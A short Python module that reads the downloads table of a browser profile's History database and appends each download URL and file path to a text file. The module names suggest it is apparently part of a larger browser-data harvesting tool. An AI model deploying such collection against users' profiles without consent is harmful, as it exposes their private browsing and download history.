from logging import log
import os
import csv
import sqlite3

#-----------------------------------------------------
from modules.Browsers._data_breeding_ import Downloads
#-----------------------------------------------------

import log_Style

def get_downloads(profile: str, downloadsFile : str) -> None:
    
    downloads_db: str = f'{profile}\\History'
    if not os.path.exists(downloads_db):
        return
    

    try:
        with sqlite3.connect(downloads_db) as conn:
            cursor: object = conn.cursor()
            cursor.execute('SELECT tab_url, target_path FROM downloads')
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                log_Style.ALL_DOWNLOADS += 1
                with open(f'{downloadsFile}\\Downlowds.txt', "a", encoding='utf-8', errors='ignore') as downloads:
                    h = Downloads(row[0], row[1])
                    downloads.write(str(h))

    except Exception as e:
        print(e)

